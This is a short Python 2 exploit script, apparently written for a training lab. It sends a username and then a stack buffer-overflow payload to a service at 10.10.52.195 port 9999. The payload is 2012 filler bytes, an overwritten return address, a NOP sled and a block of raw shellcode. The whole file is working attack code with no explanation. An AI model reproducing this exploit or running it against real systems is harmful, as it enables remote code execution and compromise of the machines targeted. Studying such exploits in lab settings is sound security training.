#!/usr/bin/python

import sys, socket
from time import sleep

username = b'Chris' 
offset = b'A'* 2012
eip = b'\xdf\x14\x50\x62' #625014DF
padding = '\x90' * 30 

shell_code = ("\xdb\xc7\xd9\x74\x24\xf4\x5f\xbd\x64\xd6\x40\x04\x31\xc9\xb1"
"\x52\x31\x6f\x17\x83\xc7\x04\x03\x0b\xc5\xa2\xf1\x2f\x01\xa0"
"\xfa\xcf\xd2\xc5\x73\x2a\xe3\xc5\xe0\x3f\x54\xf6\x63\x6d\x59"
"\x7d\x21\x85\xea\xf3\xee\xaa\x5b\xb9\xc8\x85\x5c\x92\x29\x84"
"\xde\xe9\x7d\x66\xde\x21\x70\x67\x27\x5f\x79\x35\xf0\x2b\x2c"
"\xa9\x75\x61\xed\x42\xc5\x67\x75\xb7\x9e\x86\x54\x66\x94\xd0"
"\x76\x89\x79\x69\x3f\x91\x9e\x54\x89\x2a\x54\x22\x08\xfa\xa4"
"\xcb\xa7\xc3\x08\x3e\xb9\x04\xae\xa1\xcc\x7c\xcc\x5c\xd7\xbb"
"\xae\xba\x52\x5f\x08\x48\xc4\xbb\xa8\x9d\x93\x48\xa6\x6a\xd7"
"\x16\xab\x6d\x34\x2d\xd7\xe6\xbb\xe1\x51\xbc\x9f\x25\x39\x66"
"\x81\x7c\xe7\xc9\xbe\x9e\x48\xb5\x1a\xd5\x65\xa2\x16\xb4\xe1"
"\x07\x1b\x46\xf2\x0f\x2c\x35\xc0\x90\x86\xd1\x68\x58\x01\x26"
"\x8e\x73\xf5\xb8\x71\x7c\x06\x91\xb5\x28\x56\x89\x1c\x51\x3d"
"\x49\xa0\x84\x92\x19\x0e\x77\x53\xc9\xee\x27\x3b\x03\xe1\x18"
"\x5b\x2c\x2b\x31\xf6\xd7\xbc\x34\x0e\x92\x2f\x21\x12\x1c\x41"
"\xed\x9b\xfa\x0b\x1d\xca\x55\xa4\x84\x57\x2d\x55\x48\x42\x48"
"\x55\xc2\x61\xad\x18\x23\x0f\xbd\xcd\xc3\x5a\x9f\x58\xdb\x70"
"\xb7\x07\x4e\x1f\x47\x41\x73\x88\x10\x06\x45\xc1\xf4\xba\xfc"
"\x7b\xea\x46\x98\x44\xae\x9c\x59\x4a\x2f\x50\xe5\x68\x3f\xac"
"\xe6\x34\x6b\x60\xb1\xe2\xc5\xc6\x6b\x45\xbf\x90\xc0\x0f\x57"
"\x64\x2b\x90\x21\x69\x66\x66\xcd\xd8\xdf\x3f\xf2\xd5\xb7\xb7"
"\x8b\x0b\x28\x37\x46\x88\x48\xda\x42\xe5\xe0\x43\x07\x44\x6d"
"\x74\xf2\x8b\x88\xf7\xf6\x73\x6f\xe7\x73\x71\x2b\xaf\x68\x0b"
"\x24\x5a\x8e\xb8\x45\x4f")

message = offset + eip + padding + shell_code
  
try:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect(('10.10.52.195', 9999))
	s.recv(1024)
	
	s.send(username + '\r\n')
	s.recv(1024)
	s.send(message + b'\r\n')
	s.recv(1024)
	
	s.close() 
except:
	print "Some error occured"
	sys.exit()
